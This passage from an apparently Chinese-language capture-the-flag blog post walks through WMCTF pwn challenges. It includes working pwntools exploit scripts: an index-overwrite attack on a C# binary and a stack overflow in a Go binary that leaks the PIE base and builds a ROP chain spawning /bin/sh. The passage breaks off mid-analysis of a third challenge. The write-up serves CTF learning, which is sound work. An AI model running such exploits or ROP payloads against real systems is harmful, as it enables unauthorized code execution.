class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看到逻辑很简单，申请了一个大小为100的字符串数组<code>ptr</code>，其中当前数组的<code>index</code>信息储存在<code>ptr[50]</code>的位置，而<code>ptr[51]</code>储存的是接受的字符个数。</p></li><li><p>而至于这个<code>msgHandler</code>和<code>msgHandler2</code>，他们分别是：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Program.MsgHandler msgHandler = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Right);</span><br><span class="line">Program.MsgHandler msgHandler2 = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Backdoor);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Right</span>(<span class="params"><span class="keyword">char</span>* args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(args[i]);</span><br><span class="line">&#125;</span><br><span class="line">Console.Write(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Backdoor</span>(<span class="params"><span class="keyword">char</span>* args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"I'll give you flag!"</span>);</span><br><span class="line"><span class="keyword">string</span> str = <span class="string">"type C:\\flag.txt"</span>;</span><br><span class="line">Process process = <span class="keyword">new</span> Process();</span><br><span class="line">process.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">process.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">process.Start();</span><br><span class="line">process.StandardInput.WriteLine(str + <span class="string">"&amp;exit"</span>);</span><br><span class="line">process.StandardInput.AutoFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">string</span> <span class="keyword">value</span> = process.StandardOutput.ReadToEnd();</span><br><span class="line">process.WaitForExit();</span><br><span class="line">process.Kill();</span><br><span class="line">Console.WriteLine(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，只要让程序流走到<code>msgHandler2</code>的位置也就是<code>Backdoor</code>，就能拿到flag了。</p></li><li><p>于是只要利用输入覆盖<code>ptr[50]</code>也就是<code>index</code>，使其指向内存中<code>&amp;num - 1</code>，那么下一次就能覆盖<code>num = 0</code>，从而执行<code>Backdoor</code>。</p></li><li><p>而找到<code>ptr</code>到<code>&amp;num</code>的偏移，这里需要借助动态调试，利用dnSpy attach到baby_Cat.exe进程，直接查看内存计算偏移：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803100103848.png" alt="image-20200803100103848"></p><p><code>31 00 31 00...</code>即<code>ptr</code>的位置，<code>01 00 00 00</code>即<code>num</code>的位置，从而得到偏移为<code>(0x337F1F0 - 0x337F118) / 2 - 1 = 0x6B</code>。</p></li><li><p>因此只要构造覆盖<code>ptr[50]</code>为<code>0x6C</code>，然后再输入<code>\x00</code>，即可执行到<code>Backdoor</code>，获得flag：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803100552439.png" alt="image-20200803100552439"></p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.73.46.229'</span>, <span class="number">51000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">50</span> + chr(<span class="number">0x6b</span>) + <span class="string">'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="cfgo-CheckIn"><a href="#cfgo-CheckIn" class="headerlink" title="cfgo-CheckIn"></a>cfgo-CheckIn</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先binary是upx加壳的，直接<code>upx -d cfgo-checkin</code>拿到脱壳后的程序拖到IDA分析，发现是个go，尝试用<a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="noopener">IDAGoHelper</a>恢复符号表，但恢复出来跟没恢复一样；那就直接跑看看：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102049715.png" alt="image-20200803102049715"></p></li><li><p>100个迷宫，直接写个脚本去解，因为开始做题并没有去逆向binary，而是直接通过收到的字符串判断起点和终点的符号，这里有个坑，就是代表起点和终点的字符是变化的，并不是某个特定的字符，由于是4 bytes编码的字符，其后两位都可能变化。</p></li><li><p>解出100个迷宫之后，可以输入一串字符串：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102727298.png" alt="image-20200803102727298"></p><p>本能地输入很长的字符串之后，程序就crash了，打印出了crash的路径，这里其实也可以看到，之前说的恢复符号表依然是乱七八糟的字符，其实是正确的，从这个crash的函数也可以看出来，从而可以辅助定位关键函数的位置。</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102821970.png" alt="image-20200803102821970"></p></li><li><p>后面的基本就靠猜了，首先这个crash是由于<code>malloc</code>的size过大而造成的，可以推断出stack上储存了size的临时变量，那么只要在overflow的时候尽量不破坏其他有效的变量信息，而是直接覆盖return address，就能控制程序流了。</p></li><li><p>后面经过不断地试错尝试，以及根据crash的信息辅助推断，最后确定return address的<code>offset = 0x110</code>；</p><p>以及在<code>offset = 0x70</code>的位置储存的是一个指针，后续程序复读输入的字符串就是用的这个指针输出；同时size信息储存在<code>offset = 0x78</code>的位置，只要给一个合理的值即可。</p></li><li><p>至此，还有一个问题就是，程序开了PIE，需要leak PIE，根据前一步说的，控制<code>offset = 0x70</code>就可以leak 内存中的数据。于是，根据binary的特性，可以看到stack始终是在<code>0xc000000000</code>开始的这段内存中，其中<code>0xc000000030</code>正好储存着binary代码段的地址，因此PIE可以leak了</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803104741362.png" alt="image-20200803104741362"></p></li><li><p>leak完PIE之后，显然需要继续执行binary才能达到溢出的目的，所以需要覆盖return address实现二次执行的目的，而因为这个时候并没有leak出PIE地址，所以只能通过partial overwrite的方式覆盖ret address的最后一个bytes。其实这时可以通过查找字符串需要主逻辑的地址，也就是”Leave your name:”，这里有个坑就是IDA直接搜字符串搜不到，可能因为没有解析到，通过二进制搜索可以定位到字符串的地址为`0x11EECE：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105024815.png" alt="image-20200803105024815"></p><p>根据引用找到关键函数<code>nArxBHup</code>，这里就是输出”Leave your name:”，然后接受输入，最后再复读的逻辑    </p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105249837.png" alt="image-20200803105249837"></p><p>而比较幸运的是：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105414333.png" alt="image-20200803105414333"></p><p>这里有个<code>call nArxBHup</code>的逻辑，而且正好只需要改掉地址最后一个byte为<code>\xCE</code>即可，那么这样就能再次利用栈溢出实现后续getshell的rop了</p></li><li><p>因此，总结一下，第一次利用<code>offset = 0x70</code>处的指针leak PIE，并且partial write return address返回到<code>nArxBHup</code>从而提供再次利用栈溢出的机会；第二次直接在return address布置rop getshell：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105643166.png" alt="image-20200803105643166"></p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">62176</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_to_maze</span><span class="params">(input)</span>:</span></span><br><span class="line">    strings = input.split(<span class="string">'\n'</span>)</span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strings:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        col = <span class="number">0</span></span><br><span class="line">        maze_row = []</span><br><span class="line">        <span class="keyword">while</span> i &lt; len(string):</span><br><span class="line">            <span class="keyword">if</span> string[i:].startswith(<span class="string">'\xf0\x9f\x98'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x99'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x90'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x8D'</span>):</span><br><span class="line">                start = [row, col]</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">4</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xf0\x9f\x9a'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x99'</span>):</span><br><span class="line">                end = [row, col]</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">4</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xe2\xac\x9b'</span>):</span><br><span class="line">                maze_row.append(<span class="number">0</span>)</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xe2\xac\x9c'</span>):</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> len(string[i:]) &lt; <span class="number">3</span>:</span><br><span class="line">                maze_row.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(string[i:i+<span class="number">4</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line">                print(<span class="string">"error input"</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            col += <span class="number">1</span></span><br><span class="line">        maze.append(maze_row)</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start, maze, end</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">(level)</span>:</span></span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    input_maze = <span class="string">""</span></span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> times &lt;= level + <span class="number">5</span>:</span><br><span class="line">        string_get = p.recvline()</span><br><span class="line">        input_maze += string_get</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(input_maze)</span></span><br><span class="line"></span><br><span class="line">    start, maze, end = convert_to_maze(input_maze)</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">if</span> mov(start[<span class="number">0</span>], start[<span class="number">1</span>], maze, end, sol) == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">"No solution"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">''</span>.join(sol[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(row, col, maze, end, sol)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> row == end[<span class="number">0</span>] <span class="keyword">and</span> col == end[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    maze[row][col] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    row_size = len(maze)</span><br><span class="line">    col_size = len(maze[row])</span><br><span class="line">    <span class="keyword">if</span> col &lt; col_size <span class="keyword">and</span> row + <span class="number">1</span> &lt; row_size <span class="keyword">and</span> maze[row + <span class="number">1</span>][col] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row + <span class="number">1</span>, col, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'s'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col &lt; col_size <span class="keyword">and</span> row - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> maze[row - <span class="number">1</span>][col] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row - <span class="number">1</span>, col, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'w'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col + <span class="number">1</span> &lt; col_size <span class="keyword">and</span> maze[row][col + <span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row, col + <span class="number">1</span>, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'d'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> maze[row][col - <span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row, col - <span class="number">1</span>, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'a'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    maze[row][col] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    solve_maze(i)</span><br><span class="line">    print(<span class="string">"Done "</span> + str(i))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ret_address = <span class="number">0x158</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">112</span> + p64(<span class="number">0xc000000030</span>) + p64(<span class="number">0x40</span>) + <span class="string">'A'</span> * <span class="number">0x90</span> + <span class="string">'\xCE'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Your name is : '</span>)</span><br><span class="line">PIE_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x206ac0</span></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x000000000008872e</span> <span class="comment"># pop rsp ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000109d3d</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000119c45</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000074e29</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">syscall = <span class="number">0x00000000000743c9</span> <span class="comment"># syscall</span></span><br><span class="line">input_addr = <span class="number">0x000000c00003edf8</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">112</span> + p64(<span class="number">0xc000000030</span>) + p64(<span class="number">0x40</span>) + <span class="string">'A'</span> * <span class="number">0x90</span></span><br><span class="line">payload += flat([PIE_base + pop_rax, <span class="number">0x3b</span>])</span><br><span class="line">payload += flat([PIE_base + pop_rdi, <span class="number">0x000000c000044ec8</span>])</span><br><span class="line">payload += flat([PIE_base + pop_rsi, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([PIE_base + syscall])</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"PIE_base: "</span> + hex(PIE_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="roshambo"><a href="#roshambo" class="headerlink" title="roshambo"></a>roshambo</h1><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先这个看起来挺复杂，其实仔细分析一下，可以理解为一个简单的游戏对战客户端，其中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_buffer();</span><br><span class="line">  hook_exit();</span><br><span class="line">  create_file();</span><br><span class="line">  open_file();</span><br><span class="line">  sandbox();</span><br><span class="line">  recv_client();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to WMCTF!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Roshambo is a good game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Have fun!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    client();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code>函数下，关注<code>recv_client</code>和<code>client</code>这两个函数，分别对应两个线程，一个是接受另一个客户端的消息并作出相应的动作，一个是本地客户端，用来向其他客户端发出动作，至于如何实现的客户端也就是进程间的通信，程序采用的是管道的方式，也就是通过<code>mkfifo</code>，经过文件实现进程间的通信：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1E55</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_input() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"pipe filename is wrong!"</span>);</span><br><span class="line">    quit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcat</span>(file, <span class="string">"/tmp/"</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(file, sha256_auth);</span><br><span class="line">  <span class="built_in">strcat</span>(name, file);</span><br><span class="line">  <span class="built_in">strcat</span>(name, <span class="string">"_GUEST"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( access(file, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    file_fifo = mkfifo(file, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( file_fifo )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Could not create fifo!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x17</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(name, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    file_fifo = mkfifo(name, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( file_fifo )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Could not create fifo!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x17</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  file_file[<span class="number">0</span>] = <span class="built_in">open</span>(file, <span class="number">1</span>);</span><br><span class="line">  result = <span class="built_in">open</span>(name, <span class="number">0</span>);</span><br><span class="line">  name_file = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个函数逻辑只有在Mode C的情况下（程序提供两种模式：C &amp; L）才会调用，也就是说必须有一个C和一个L才能互相通信，而文件名是Mode C下通过对输入的<code>Authentication</code>进行<code>sha256</code>计算得到的，所以另一个Mode L只要通过在输入<code>room</code>时输入这个sha256值就能建立起连接。</p><p>至于交互的细节，可以在<code>recv_client</code>中看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+20h] [rbp-1000h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+48h] [rbp-FD8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( !mode_is_L || mode_is_L == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(file_file[mode_is_L == <span class="number">0</span>], &amp;s, <span class="number">0x38</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(file_file[mode_is_L == <span class="number">0</span>], &amp;v4, nbytes);</span><br><span class="line">    v1 = cmp_with__RPC_(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      play_game((__int64)&amp;s);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  quit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类比成一个最长为0x1000 bytes的数据包，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+----------+--------+----------+</span><br><span class="line">|    8   |   8    |     8    |   32   | name_len |</span><br><span class="line">+--------+--------+----------+--------+----------+</span><br><span class="line">| status | option | name_len | sha256 |   name   |</span><br><span 